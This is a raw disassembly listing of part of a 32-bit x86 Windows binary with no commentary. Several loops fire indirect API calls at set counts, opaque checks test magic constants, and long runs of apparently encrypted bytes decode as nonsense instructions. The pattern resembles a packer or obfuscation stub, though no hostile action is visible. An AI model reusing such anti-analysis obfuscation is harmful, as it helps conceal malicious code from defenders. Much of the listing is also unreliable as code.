  401814:	or     esp,ebx
  401816:	imul   edi,DWORD PTR [ebp+0x54517ae6],0x3b02bf9e
  401820:	add    BYTE PTR [eax],al
  401822:	add    ax,di
  401825:	mov    DWORD PTR ds:0x430455,0x60d8
  40182f:	movzx  eax,ax
  401832:	and    DWORD PTR ds:0x430459,0x0
  40183c:	mov    esi,DWORD PTR ds:0x430459
  401842:	inc    esi
  401843:	mov    DWORD PTR ds:0x430459,esi
  401849:	cmp    DWORD PTR ds:0x430459,0x1d
  401850:	jne    0x401863
  401856:	push   0x0
  401858:	push   0x21fd
  40185d:	call   DWORD PTR ds:0x42ea93
  401863:	cmp    DWORD PTR ds:0x430459,0x10
  40186a:	jb     0x40183c
  401870:	sbb    esi,0x67dd
  401876:	not    eax
  401878:	and    eax,DWORD PTR [ecx]
  40187a:	and    DWORD PTR ds:0x4304e3,0x0
  401884:	jmp    0x401898
  401889:	xor    esi,esi
  40188b:	xor    esi,DWORD PTR ds:0x4304e3
  401891:	inc    esi
  401892:	mov    DWORD PTR ds:0x4304e3,esi
  401898:	cmp    DWORD PTR ds:0x4304e3,0x1b
  40189f:	jae    0x4018dc
  4018a5:	cmp    DWORD PTR ds:0x4304e3,0x8
  4018ac:	jne    0x4018bd
  4018b2:	push   0x780b
  4018b7:	call   DWORD PTR ds:0x42e9ab
  4018bd:	cmp    DWORD PTR ds:0x4304e3,0x7
  4018c4:	jne    0x4018d7
  4018ca:	mov    esi,DWORD PTR ds:0x4304e3
  4018d0:	inc    esi
  4018d1:	mov    DWORD PTR ds:0x4304e3,esi
  4018d7:	jmp    0x401889
  4018dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4018df:	add    esi,DWORD PTR ds:0x42edd7
  4018e5:	mov    DWORD PTR [ecx],eax
  4018e7:	and    DWORD PTR ds:0x42eddb,0x0
  4018f1:	mov    esi,DWORD PTR ds:0x42eddb
  4018f7:	inc    esi
  4018f8:	mov    DWORD PTR ds:0x42eddb,esi
  4018fe:	cmp    DWORD PTR ds:0x42eddb,0xb
  401905:	jne    0x401914
  40190b:	push   DWORD PTR [ebp-0x1c]
  40190e:	call   DWORD PTR ds:0x42ec0f
  401914:	cmp    DWORD PTR ds:0x42eddb,0xa
  40191b:	jne    0x40192e
  401921:	mov    esi,DWORD PTR ds:0x42eddb
  401927:	inc    esi
  401928:	mov    DWORD PTR ds:0x42eddb,esi
  40192e:	cmp    DWORD PTR ds:0x42eddb,0x17
  401935:	jb     0x4018f1
  40193b:	sbb    DWORD PTR ds:0x42edcb,0x20dd
  401945:	mov    ecx,0x7510854
  40194a:	and    DWORD PTR ds:0x4304db,0x0
  401954:	jmp    0x401966
  401959:	mov    esi,DWORD PTR ds:0x4304db
  40195f:	inc    esi
  401960:	mov    DWORD PTR ds:0x4304db,esi
  401966:	cmp    DWORD PTR ds:0x4304db,0x12
  40196d:	jae    0x4019a5
  401973:	cmp    DWORD PTR ds:0x4304db,0x22
  40197a:	jne    0x40199a
  401980:	push   0x7ffb
  401985:	push   0x8364
  40198a:	push   0x42e8b7
  40198f:	push   0x6aad
  401994:	call   DWORD PTR ds:0x42ea97
  40199a:	jmp    0x401959
  40199f:	sbb    esi,DWORD PTR ds:0x43043d
  4019a5:	mov    esi,0x32729b
  4019aa:	push   ebx
  4019ab:	and    DWORD PTR ds:0x430435,0x0
  4019b5:	xor    ebx,ebx
  4019b7:	or     ebx,DWORD PTR ds:0x430435
  4019bd:	inc    ebx
  4019be:	mov    DWORD PTR ds:0x430435,ebx
  4019c4:	cmp    DWORD PTR ds:0x430435,0x19
  4019cb:	jne    0x4019e5
  4019d1:	push   0x42e945
  4019d6:	push   DWORD PTR [ebp-0x20]
  4019d9:	push   DWORD PTR [ebp-0x10]
  4019dc:	push   DWORD PTR [ebp-0xc]
  4019df:	call   DWORD PTR ds:0x42e9bb
  4019e5:	cmp    DWORD PTR ds:0x430435,0x16
  4019ec:	jb     0x4019b5
  4019f2:	mov    ax,WORD PTR [ebp-0x24]
  4019f6:	movzx  eax,ax
  4019f9:	mov    DWORD PTR [ebp-0x38],eax
  4019fc:	mov    eax,DWORD PTR [ebp+0x8]
  4019ff:	mov    DWORD PTR [ebp-0x28],eax
  401a02:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  401a09:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  401a10:	mov    eax,0x9577
  401a15:	mov    WORD PTR [ebp-0x4],ax
  401a19:	lea    eax,[ebp-0x30]
  401a1c:	mov    DWORD PTR [ebp-0x34],eax
  401a1f:	mov    eax,DWORD PTR [ebp-0x28]
  401a22:	mov    DWORD PTR [ebp-0x2c],eax
  401a25:	lea    eax,[ebp-0x18]
  401a28:	mov    DWORD PTR [ebp-0x1c],eax
  401a2b:	mov    eax,DWORD PTR [ebp-0x1c]
  401a2e:	mov    DWORD PTR [eax],0xf89f2da9
  401a34:	mov    eax,DWORD PTR [ebp-0x14]
  401a37:	mov    ebx,DWORD PTR [ebp-0x8]
  401a3a:	xor    eax,ecx
  401a3c:	xor    ebx,ecx
  401a3e:	xor    edx,edx
  401a40:	add    eax,esi
  401a42:	add    ebx,esi
  401a44:	div    ebx
  401a46:	mov    edx,DWORD PTR [ebp-0x2c]
  401a49:	cmp    eax,DWORD PTR [edx]
  401a4b:	je     0x402095
  401a51:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  401a58:	jmp    0x401c1b
  401a5d:	mov    DWORD PTR [ebp-0x5a],0xc159a499
  401a64:	popa   
  401a65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a66:	ja     0x401a61
  401a68:	and    eax,0xebca0e4d
  401a6d:	xchg   esi,eax
  401a6e:	js     0x401aee
  401a70:	jle    0x401a0a
  401a72:	jg     0x401af2
  401a74:	jle    0x401a6b
  401a76:	mov    BYTE PTR [edi-0x3c6a5211],dh
  401a7c:	cmp    al,0x5c
  401a7e:	sbb    al,0x6c
  401a80:	sti    
  401a81:	mov    ch,BYTE PTR [esi-0x3a480b46]
  401a87:	sbb    cl,bl
  401a89:	mov    edi,0x92defc7e
  401a8e:	mov    bl,0xe6
  401a90:	cmp    bh,cl
  401a92:	cli    
  401a93:	pop    ebp
  401a94:	mov    dh,dl
  401a96:	or     esi,DWORD PTR [eax+0x49]
  401a99:	out    0x30,al
  401a9b:	ret    0xda4e
  401a9e:	xchg   esi,eax
  401a9f:	push   0x8c74c7be
  401aa4:	into   
  401aa5:	mov    ds:0x9c63fa8c,al
  401aaa:	icebp  
  401aab:	mov    ebp,0xfef39fb1
  401ab0:	mov    BYTE PTR [edx-0x6644d51d],bl
  401ab6:	addr16 hlt 
  401ab8:	add    esp,DWORD PTR [edx+eiz*4+0x27]
  401abc:	jae    0x401afb
  401abe:	fisttp QWORD PTR [esi+0x2890d0b6]
  401ac4:	mov    ebx,0x22753a8d
  401ac9:	je     0x401a6a
  401acb:	test   BYTE PTR [eax+0x2169b637],bh
  401ad1:	retf   0x1e49
  401ad4:	dec    esp
  401ad5:	sbb    ah,BYTE PTR [ecx]
  401ad7:	sbb    ch,BYTE PTR [eax]
  401ad9:	scas   al,BYTE PTR es:[edi]
  401ada:	cmp    al,0x38
  401adc:	lock fsubr QWORD PTR [edx]
  401adf:	mov    edi,0xdcd55abb
  401ae4:	js     0x401b1f
  401ae6:	shl    ecx,0xd5
  401ae9:	jns    0x401ace
  401aeb:	mov    dl,0x2b
  401aed:	arpl   WORD PTR [esi+0x1a],di
  401af0:	sbb    BYTE PTR [edi],0x2f
  401af3:	push   0xffffff9e
  401af5:	loopne 0x401ad1
  401af7:	push   0x4e7882fc
  401afc:	mov    ebp,0xd09df72b
  401b01:	push   edi
  401b02:	sbb    ch,BYTE PTR [edi-0x48]
  401b05:	retf   
  401b06:	inc    esi
  401b07:	jp     0x401b2f
  401b09:	and    DWORD PTR [esi+0x547cd75],esi
  401b0f:	lds    esi,FWORD PTR [ebx]
  401b11:	mov    ecx,0xdfdfe11c
  401b16:	mov    ds:0x4da978e9,eax
  401b1b:	test   esp,ecx
  401b1d:	ficom  WORD PTR [esi-0x23]
  401b20:	mov    edi,0x2a479c5c
  401b25:	xor    eax,0x376a5cb2
  401b2a:	adc    cl,BYTE PTR [ebp+0x797ce1c9]
  401b30:	add    cl,BYTE PTR [ebp-0x6f025aa5]
  401b36:	push   ebp
  401b37:	ret    0xc28b
  401b3a:	jmp    0x12e98041
  401b3f:	push   es
  401b40:	ret    0x5d01
  401b43:	pusha  
  401b44:	cmp    al,0xd1
  401b46:	ins    DWORD PTR es:[edi],dx
  401b47:	and    DWORD PTR [esi],esi
  401b49:	push   cs
  401b4a:	(bad)  
  401b4b:	mov    ebp,0xda32b97e
  401b50:	mov    dh,BYTE PTR [edx]
  401b52:	xor    DWORD PTR [esi+0x12],esi
  401b55:	in     eax,dx
  401b56:	nop
  401b57:	add    BYTE PTR [edi+ecx*2+0x29],bh
  401b5b:	dec    eax
  401b5c:	imul   edi,DWORD PTR [edx],0x7e5cedb2
  401b62:	test   DWORD PTR [ebp+0x56],esp
  401b65:	loope  0x401b18
  401b67:	pop    edi
  401b68:	sbb    BYTE PTR [ebp+eiz*1-0x36],0xc4
  401b6d:	gs dec edi
  401b6f:	ins    DWORD PTR es:[edi],dx
  401b70:	dec    esp
  401b71:	(bad)  [esi+0x5dc73ac6]
  401b77:	mov    ds:0xb8f632b1,eax
  401b7c:	xor    al,0xa7
  401b7e:	inc    eax
  401b7f:	nop
  401b80:	hlt    
  401b81:	xor    esi,DWORD PTR [eax-0x73acede0]
  401b87:	fsub   DWORD PTR [eax+0x3ddb6bca]
  401b8d:	hlt    
  401b8e:	and    ah,BYTE PTR [ebp-0x7b83c55a]
  401b94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b95:	push   edi
  401b96:	and    eax,0x48c1f398
  401b9b:	mov    al,ds:0xef807c4c
  401ba0:	push   eax
  401ba1:	xor    BYTE PTR [edx+0x3a],bl
  401ba4:	sub    BYTE PTR [ecx+0x4153d61e],dl
  401baa:	(bad)  
  401bab:	xchg   ebp,eax
  401bac:	aad    0x58
  401bae:	jno    0x401b90
  401bb0:	mov    dh,0xfe
  401bb2:	mov    fs,WORD PTR [ebx]
  401bb4:	call   0xc699:0xef294bfe
  401bbb:	dec    esp
  401bbc:	or     al,0x8
  401bbe:	ins    DWORD PTR es:[edi],dx
  401bbf:	push   es
  401bc0:	pusha  
  401bc1:	mov    ebp,0xae7d79d7
  401bc6:	mov    bl,0xed
  401bc8:	dec    ecx
  401bc9:	scas   al,BYTE PTR es:[edi]
  401bca:	xor    BYTE PTR [esi],ch
  401bcc:	(bad)  
  401bcd:	fcmovnu st,st(1)
  401bcf:	sub    DWORD PTR [edi+eiz*1-0x26d2f2f9],esi
  401bd6:	ret    
  401bd7:	mov    eax,0xd35bb1b7
  401bdc:	mov    ch,0xc7
  401bde:	pop    ebx
  401bdf:	inc    eax
  401be0:	inc    esp
  401be1:	jmp    0x401bad
  401be3:	jns    0x401c13
  401be5:	retf   
  401be6:	jnp    0x401c06
  401be8:	fsub   QWORD PTR [ebx-0x53]
  401beb:	nop
  401bec:	fdivr  DWORD PTR [esi]
  401bee:	ret    0xc70a
  401bf1:	mov    al,0x11
  401bf3:	cmp    DWORD PTR [ecx+0x7a519b2c],0x35
  401bfa:	xchg   DWORD PTR [eax-0x73],ebp
  401bfd:	push   cs
  401bfe:	or     eax,0x3041f930
  401c03:	mov    edi,0xa02bfe7a
  401c08:	pop    es
  401c09:	push   edx
  401c0a:	je     0x401c17
  401c0c:	mov    DWORD PTR [edx+edx*8],edi
  401c0f:	fwait
  401c10:	mov    ds:0x4a66679,eax
  401c15:	sbb    ebx,edi
  401c17:	std    
  401c18:	inc    ebp
  401c19:	mov    al,0x22
  401c1b:	lea    eax,[ebp-0xc]
  401c1e:	mov    DWORD PTR [ebp-0x10],eax
  401c21:	mov    eax,DWORD PTR [ebp-0x10]
  401c24:	mov    edx,DWORD PTR [eax]
  401c26:	imul   edx,edx,0xf89ea9ee
  401c2c:	mov    DWORD PTR [eax],edx
  401c2e:	mov    eax,DWORD PTR [ebp-0xc]
  401c31:	cmp    eax,0x823721f2
  401c36:	je     0x401c4a
  401c3c:	mov    eax,DWORD PTR [ebp-0x1c]
  401c3f:	or     DWORD PTR [eax],0x60751c9e
  401c45:	jmp    0x4020a4
  401c4a:	mov    eax,DWORD PTR [ebp-0xc]
  401c4d:	add    eax,DWORD PTR [ebp-0x18]
  401c50:	cmp    eax,0x7ad64f9b
  401c55:	je     0x401c69
  401c5b:	mov    eax,DWORD PTR [ebp-0x10]
  401c5e:	and    DWORD PTR [eax],0x751c99
  401c64:	jmp    0x4020a4
  401c69:	mov    eax,DWORD PTR [ebp-0xc]
  401c6c:	mov    edx,DWORD PTR [ebp-0x18]
  401c6f:	or     eax,edx
  401c71:	cmp    eax,0xfabf2dfb
  401c76:	je     0x401e4d
  401c7c:	mov    eax,DWORD PTR [ebp-0x10]
  401c7f:	jmp    0x401e42
  401c84:	das    
  401c85:	adc    bh,cl
  401c87:	inc    edx
  401c88:	icebp  
  401c89:	inc    ecx
  401c8a:	mov    bl,0x71
  401c8c:	test   DWORD PTR [edx],ebx
  401c8e:	and    bl,BYTE PTR [esi]
  401c90:	ret    0xbe82
  401c93:	div    BYTE PTR [eax]
  401c95:	push   es
  401c96:	jle    0x401d16
  401c98:	cwde   
  401c99:	jg     0x401d19
  401c9b:	jle    0x401c69
  401c9d:	or     al,0xe0
  401c9f:	xor    BYTE PTR [esi],cl
  401ca1:	clc    
  401ca2:	pop    esp
  401ca3:	fwait
  401ca4:	xchg   esp,eax
  401ca5:	xor    DWORD PTR [edi-0x40eb9831],ecx
  401cab:	ror    BYTE PTR [edi+0x791f9f11],1
  401cb1:	mov    cl,0xcb
  401cb3:	pop    ds
  401cb4:	adc    al,0x26
  401cb6:	mov    edi,0x66ea6d8b
  401cbb:	mov    ebp,0x4f919c7b
  401cc0:	push   0xffffffdf
  401cc2:	xchg   DWORD PTR ds:0x3c0b4037,ecx
  401cc8:	in     al,dx
  401cc9:	sti    
  401cca:	in     eax,dx
  401ccb:	cmp    bh,BYTE PTR [esp+edi*1]
  401cce:	fdivp  st(7),st
  401cd0:	dec    esp
  401cd1:	dec    edi
  401cd2:	and    eax,0x97b75e34
  401cd7:	cli    
  401cd8:	lock dec esi
  401cda:	cs sub ch,dl
  401cdd:	xor    esi,esp
  401cdf:	jmp    0x6da8:0x3b8660d0
  401ce6:	xor    cl,BYTE PTR [edx+0x3e]
  401ce9:	push   ebx
  401cea:	pop    edx
  401ceb:	cdq    
  401cec:	rcr    DWORD PTR [ecx],cl
  401cee:	sub    eax,0x5726c9f5
  401cf3:	jnp    0x401c81
  401cf5:	and    eax,0x8b73d786
  401cfa:	xor    eax,DWORD PTR [eax+0x34]
  401cfd:	and    ebx,esi
  401cff:	sub    BYTE PTR [edx+0x7dc83b33],dl
  401d05:	or     DWORD PTR [esi+0x29],ebx
  401d08:	(bad)  
  401d09:	out    0x5b,al
  401d0b:	es jp  0x401d6e
  401d0e:	dec    edx
  401d0f:	jns    0x401cff
  401d11:	rol    BYTE PTR [ebx],cl
  401d13:	and    eax,0xe58062
  401d18:	mov    bl,0xf9
  401d1a:	arpl   si,si
  401d1c:	mov    eax,0xb7d9b9b3
  401d21:	fiadd  WORD PTR [ebx-0x34b58f33]
  401d27:	dec    esp
  401d28:	mov    eax,ds:0xd2680eed
  401d2d:	sbb    eax,0x69278c51
  401d32:	push   edi
  401d33:	out    0x3c,al
  401d35:	daa    
  401d36:	scas   al,BYTE PTR es:[edi]
  401d37:	mov    bl,0x4d
  401d39:	push   ebp
  401d3a:	inc    ebx
  401d3c:	cs inc edx
  401d3e:	cwde   
  401d3f:	cmp    al,BYTE PTR [edi+0x1a]
  401d42:	jg     0x401d69
  401d44:	mov    bh,0xe7
  401d46:	daa    
  401d47:	aaa    
  401d48:	jle    0x401da4
  401d4a:	(bad)  
  401d4c:	pop    ss
  401d4d:	pusha  
  401d4e:	pop    ecx
  401d4f:	push   edx
  401d50:	push   0xfffffffe
  401d52:	out    dx,al
  401d53:	dec    eax
  401d54:	xchg   ebp,eax
  401d55:	call   0x315c0e9d
  401d5a:	iret   
  401d5b:	(bad)  
  401d5c:	aad    0x18
  401d5e:	out    dx,al
  401d5f:	inc    esi
  401d60:	fwait
  401d61:	adc    eax,0xa69f87d0
  401d66:	and    ebp,ecx
  401d68:	adc    ebx,eax
  401d6a:	mov    edi,0xf47bfd03
  401d6f:	ret    0x7ff1
  401d72:	pop    ecx
  401d73:	sbb    eax,0xdfebd111
  401d78:	aad    0x7a
  401d7a:	daa    
  401d7b:	inc    ebx
  401d7c:	xor    eax,0x75f5d2a8
  401d81:	cmp    DWORD PTR [ecx-0x53],edi
  401d84:	xchg   edx,eax
  401d85:	int    0xc7
  401d87:	(bad)  
  401d89:	sar    BYTE PTR ds:0xe0234cad,0x79
  401d90:	inc    edx
  401d91:	dec    ebp
  401d92:	jl     0x401db3
  401d94:	shr    ebp,0x6f
  401d97:	pop    ds
  401d98:	add    DWORD PTR [eax-0x79095bd4],0x77
  401d9f:	inc    ecx
  401da0:	mov    ch,0xcf
  401da2:	add    dl,BYTE PTR ds:0x90752dba
  401da8:	add    edi,DWORD PTR [ebx]
  401daa:	retf   
  401dab:	retf   
  401dac:	stc    
  401dad:	cs mov ebx,0xbd3f6331
  401db3:	dec    edx
  401db4:	sub    BYTE PTR [ebx-0x3a],0xcd
  401db8:	xchg   DWORD PTR [edi+0x78bac1b1],eax
  401dbe:	(bad)  
  401dc0:	fmul   st(6),st
  401dc2:	push   edi
  401dc3:	mov    ds:0x921919b2,al
  401dc8:	push   0xe0917119
  401dcd:	xor    eax,0x16d439d3
  401dd2:	push   ss
  401dd3:	xchg   ecx,eax
  401dd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dd5:	and    al,0x6b
  401dd7:	mov    eax,esi
  401dd9:	(bad)  
  401dda:	and    dh,BYTE PTR [ebp+0x75e23ce9]
  401de0:	loopne 0x401de5
  401de2:	mov    ch,0x17
  401de4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401de5:	enter  0x457e,0xb5
  401de9:	arpl   WORD PTR ds:0x7fcab32,bp
  401def:	fldcw  WORD PTR [ecx-0x51]
  401df2:	pop    ebp
  401df3:	das    
  401df4:	xor    al,0xa1
  401df6:	or     eax,0x4a8acc78
  401dfb:	adc    DWORD PTR ds:0x5cfe0244,ebx
  401e01:	push   edx
  401e02:	repz mov bh,0xad
  401e05:	test   bh,bh
  401e07:	sbb    ch,al
  401e09:	pop    ebx
  401e0a:	ja     0x401e26
  401e0c:	popa   
  401e0d:	mov    WORD PTR [eax+0x74],gs
  401e10:	inc    ecx
  401e11:	fucomi st,st(1)
  401e13:	lods   al,BYTE PTR ds:[esi]
  401e14:	mov    cl,0xcc
  401e16:	jg     0x401e65
  401e18:	shl    DWORD PTR [eax+ebp*8+0x38608ca6],1
  401e1f:	mov    ds:0x5fc3ee9c,eax
  401e24:	lods   al,BYTE PTR ds:[esi]
  401e25:	jnp    0x401dc6
  401e27:	pop    ds
  401e28:	pop    ecx
  401e29:	xor    dh,BYTE PTR [ebx-0x78]
  401e2c:	out    0xfc,al
  401e2e:	sub    al,bh
  401e30:	das    
  401e31:	inc    ecx
  401e32:	ins    BYTE PTR es:[edi],dx
  401e33:	cwde   
  401e34:	xchg   ecx,eax
  401e35:	aas    
  401e36:	leave  
  401e37:	bound  ebp,QWORD PTR [eax+ebp*2]
  401e3a:	fbstp  TBYTE PTR [edx]
  401e3c:	mov    ebp,0x5ed42041
  401e41:	inc    esi
  401e42:	xor    DWORD PTR [eax],0x2650fa8f
  401e48:	jmp    0x4020a4
  401e4d:	mov    ax,WORD PTR [ebp-0x4]
  401e51:	mov    edx,0x8a3c
  401e56:	xor    ax,dx
  401e59:	mov    edx,DWORD PTR [ebp-0x28]
  401e5c:	mov    edx,DWORD PTR [edx]
  401e5e:	add    ax,di
  401e61:	cmp    ax,WORD PTR [edx]
  401e64:	je     0x402074
  401e6a:	mov    eax,DWORD PTR [ebp-0x14]
  401e6d:	xor    eax,ecx
  401e6f:	jmp    0x402032
  401e74:	mov    ebp,0xd91a1ffb
  401e79:	call   0xdfe:0x67459b9
  401e80:	cli    
  401e81:	jp     0x401ee3
  401e83:	dec    esp
  401e84:	pop    edx
  401e85:	pop    es
  401e86:	jle    0x401f06
  401e88:	cwde   
  401e89:	jg     0x401f09
  401e8b:	jle    0x401e9a
  401e8d:	push   es
  401e8e:	mov    al,0x62
  401e90:	inc    esp
  401e91:	ficom  DWORD PTR [eax]
  401e93:	or     al,0x76
  401e95:	mov    ebp,0xa5ff8edd
  401e9a:	bound  edi,QWORD PTR [eax+0x56f98dcc]
  401ea0:	and    DWORD PTR [eax+0x12],ecx
  401ea3:	arpl   WORD PTR [ecx+0x60bb3e8f],bp
  401ea9:	repnz adc DWORD PTR [ebp-0x49],edx
  401ead:	repz cdq 
  401eaf:	push   ebx
  401eb0:	xchg   DWORD PTR [edi],edx
  401eb2:	pop    ds
  401eb3:	into   
  401eb4:	inc    eax
  401eb5:	or     eax,0x6b5a8625
  401eba:	adc    DWORD PTR [ebx+edi*8],esi
  401ebd:	sub    ch,BYTE PTR [edi]
  401ebf:	cld    
  401ec0:	das    
  401ec1:	mov    ecx,DWORD PTR [edi+edi*8-0x4c889427]
  401ec8:	cli    
  401ec9:	sbb    al,0xa1
  401ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ecc:	lods   eax,DWORD PTR ds:[esi]
  401ecd:	lods   al,BYTE PTR ds:[esi]
  401ece:	call   0x5eac8c4c
  401ed3:	push   ebx
  401ed4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ed5:	xor    BYTE PTR [ebx-0x3d7f58f],ch
  401edb:	into   
  401edc:	dec    esi
  401edd:	fnstcw WORD PTR [ecx-0x74]
  401ee0:	aaa    
  401ee1:	or     BYTE PTR [edi-0x63],0xea
  401ee5:	and    DWORD PTR [esi+0x6fae5c4c],esi
  401eeb:	icebp  
  401eec:	xor    eax,edx
  401eee:	push   ecx
  401eef:	pop    edi
  401ef0:	leave  
  401ef1:	bnd jo 0x401f36
  401ef4:	aas    
  401ef5:	frstor [ebx]
  401ef7:	mov    dl,0x58
  401ef9:	mov    dx,0xfaae
  401efd:	sub    eax,0xf6568a77
  401f02:	out    dx,al
  401f03:	test   BYTE PTR [ecx],dh
  401f05:	fwait
  401f06:	cmp    BYTE PTR [ebx],cl
  401f08:	pop    ebp
  401f09:	test   al,0x50
  401f0b:	push   ebx
  401f0c:	and    cl,BYTE PTR [ecx-0x32c3a859]
  401f12:	or     ah,cl
  401f14:	push   edx
  401f15:	(bad)  
  401f16:	xchg   ecx,eax
  401f17:	int    0xdf
  401f19:	fcom   DWORD PTR [edi+0x6a5ac0a]
  401f1f:	outs   dx,DWORD PTR ds:[esi]
  401f20:	jnp    0x401f9d
  401f22:	or     ecx,ebp
  401f24:	scas   eax,DWORD PTR es:[edi]
  401f25:	rol    DWORD PTR [esi],1
  401f27:	cmp    ch,al
  401f29:	fdivr  QWORD PTR [edx+0x6f]
  401f2c:	into   
  401f2d:	mov    edi,?
  401f2f:	pop    ss
  401f30:	cmp    bl,BYTE PTR [ecx-0x5a]
  401f33:	pop    edi
  401f34:	ror    DWORD PTR [ecx+0x7b],cl
  401f37:	out    dx,eax
  401f38:	xchg   esp,eax
  401f39:	sti    
  401f3a:	sbb    ch,BYTE PTR [edx+0x7a]
  401f3d:	jle    0x401f54
  401f3f:	js     0x401edc
  401f41:	sahf   
  401f42:	inc    esp
  401f43:	cli    
  401f44:	sbb    eax,0x6fc7b4bc
  401f49:	out    dx,al
  401f4a:	xlat   BYTE PTR ds:[ebx]
  401f4b:	out    0x86,eax
  401f4d:	ret    
  401f4e:	ja     0x401ee2
  401f50:	fs jl  0x401f91
  401f53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f54:	aas    
  401f55:	xchg   esp,eax
  401f56:	jne    0x401f52
  401f58:	jb     0x401fd8
  401f5a:	push   0x7a
  401f5c:	cmovns esp,DWORD PTR [esi-0x68]
  401f60:	rol    BYTE PTR [edi],cl
  401f62:	int3   
  401f63:	adc    al,0xe
  401f65:	out    dx,eax
  401f66:	inc    edx
  401f67:	shl    WORD PTR [ecx+0x8fa73fe],0x47
  401f6f:	sar    edi,1
  401f71:	and    al,dh
  401f73:	retf   0x333
  401f76:	sbb    al,0x96
  401f78:	lds    edi,FWORD PTR [ecx+0x18]
  401f7b:	mov    bh,BYTE PTR [esi+0x5638a00f]
  401f81:	test   BYTE PTR cs:[ebx],dl
  401f84:	inc    eax
  401f85:	xchg   DWORD PTR [ebx+0x63],ecx
  401f88:	pop    ecx
  401f89:	nop
  401f8a:	fwait
  401f8b:	adc    ah,BYTE PTR cs:[edi-0x387d579e]
  401f92:	push   esp
  401f93:	imul   esp,DWORD PTR [esi-0x28d51a10],0x68
  401f9a:	(bad)  
  401f9b:	fsubr  st(0),st
  401f9d:	xor    eax,0x317a747
  401fa2:	adc    eax,0x1f
  401fa5:	jecxz  0x401ff5
  401fa7:	push   ds
  401fa8:	inc    esp
  401fa9:	shl    esp,cl
  401fab:	mov    al,BYTE PTR [edi]
  401fad:	ins    BYTE PTR es:[edi],dx
  401fae:	test   DWORD PTR [eax+0x171e7a62],ebp
  401fb4:	pop    esi
  401fb5:	arpl   WORD PTR [edi+0x5347560f],di
  401fbb:	stos   DWORD PTR es:[edi],eax
  401fbc:	test   eax,0x6b603f93
  401fc1:	mov    ds:0x8c3f207,al
  401fc6:	cmp    eax,0x3e8daebc
  401fcb:	test   BYTE PTR [esi],bh
  401fcd:	lea    eax,[ecx-0x5dc49c45]
  401fd3:	xchg   esi,eax
  401fd4:	(bad)  
  401fd6:	mov    ds:0xb97ad1f3,al
  401fdb:	lods   al,BYTE PTR ds:[esi]
  401fdc:	adc    al,BYTE PTR [ebx+0x6b80de9c]
  401fe2:	sar    DWORD PTR [ecx+0x69],0xf3
  401fe6:	aaa    
  401fe7:	call   0x2f6a2fb0
  401fec:	inc    esp
  401fed:	push   esp
  401fee:	int3   
  401fef:	xchg   edi,eax
  401ff0:	dec    ebp
  401ff1:	jo     0x402067
  401ff3:	shr    edx,1
  401ff5:	and    BYTE PTR [esi-0x94b47f4],0x5
  401ffc:	fild   WORD PTR [edx+edi*4-0x28]
  402000:	ds push eax
  402002:	rcl    BYTE PTR [esi],cl
  402004:	cmp    dl,BYTE PTR [esp+ebx*4-0x667c8f50]
  40200b:	mov    bh,0x3c
  40200d:	sub    eax,0x13b4a793
  402012:	fs jb  0x40204f
  402015:	jmp    0x401f97
  402017:	sbb    al,0x8b
  402019:	(bad)
  40201c:	in     eax,0x52
  40201e:	sar    ebp,cl
  402020:	pop    ebp
  402021:	sbb    esi,ebx
  402023:	repnz popa 
  402025:	xchg   ebx,eax
  402026:	mov    ds:0x93a1d1a6,al
  40202b:	ins    DWORD PTR es:[edi],dx
  40202c:	jmp    0x4020ac
  40202e:	push   ss
  40202f:	fst    DWORD PTR [ecx-0x7639fcf9]
  402035:	inc    ebp
  402036:	ror    BYTE PTR [ebx-0x749933bb],1
  40203c:	push   ebp
  40203d:	enter  0x3cbb,0x8a
  402041:	add    BYTE PTR [eax],al
  402043:	xor    dx,bx
  402046:	mov    ebx,DWORD PTR [ebp-0x8]
  402049:	add    dx,di
  40204c:	movzx  edx,dx
  40204f:	xor    ebx,ecx
  402051:	lea    edx,[edx+ebx*1+0x32729b]
  402058:	add    DWORD PTR [eax],edx
  40205a:	mov    eax,DWORD PTR [ebp-0x2c]
  40205d:	mov    edx,DWORD PTR [ebp-0x8]
  402060:	mov    ebx,DWORD PTR [ebp-0x30]
  402063:	xor    edx,ecx
  402065:	add    edx,esi
  402067:	imul   edx,ebx
  40206a:	sub    DWORD PTR [eax],edx
  40206c:	mov    eax,DWORD PTR [ebp-0x14]
  40206f:	jmp    0x4020a7
  402074:	mov    eax,DWORD PTR [ebp-0xc]
  402077:	mov    edx,DWORD PTR [ebp-0x18]
  40207a:	xor    eax,edx
  40207c:	cmp    eax,0x7aa80c5b
  402081:	je     0x4020a4
  402087:	mov    eax,DWORD PTR [ebp-0x10]
  40208a:	add    DWORD PTR [eax],0x7403501
  402090:	jmp    0x4020a4
  402095:	mov    eax,DWORD PTR [ebp-0x1c]
  402098:	cmp    DWORD PTR [eax],0xf89f2da9
  40209e:	jne    0x4020bf
  4020a4:	mov    eax,DWORD PTR [ebp-0x8]
  4020a7:	xor    eax,ecx
  4020a9:	add    eax,esi
  4020ab:	test   eax,eax
  4020ad:	jne    0x4020bf
  4020b3:	xor    DWORD PTR [ebp-0x20],0xe149eb8
  4020ba:	jmp    0x4019ab
  4020bf:	pop    ebx
  4020c0:	pop    edi
  4020c1:	pop    esi
  4020c2:	leave  
  4020c3:	ret    0x4
  4020c6:	push   ebp
  4020c7:	mov    ebp,esp
  4020c9:	sub    esp,0x28
  4020cc:	leave  
  4020cd:	ret    0x10
  4020d0:	push   ebp
  4020d1:	mov    ebp,esp
  4020d3:	jmp    0x4022cb
  4020d8:	outs   dx,BYTE PTR ds:[esi]
  4020d9:	jecxz  0x402113
  4020db:	mov    ecx,0xf16f6151
  4020e0:	jne    0x402154
  4020e2:	add    al,0xd
  4020e4:	xchg   ebp,eax
  4020e5:	or     edi,DWORD PTR [esi]
  4020e7:	inc    edx
  4020e8:	test   BYTE PTR ds:0x7f557e7e,al
  4020ee:	jle    0x40216e
  4020f0:	mov    esp,0xf9f2f938
  4020f5:	mov    eax,0x94e01b0f
  4020fa:	add    al,0x29
  4020fc:	(bad)  
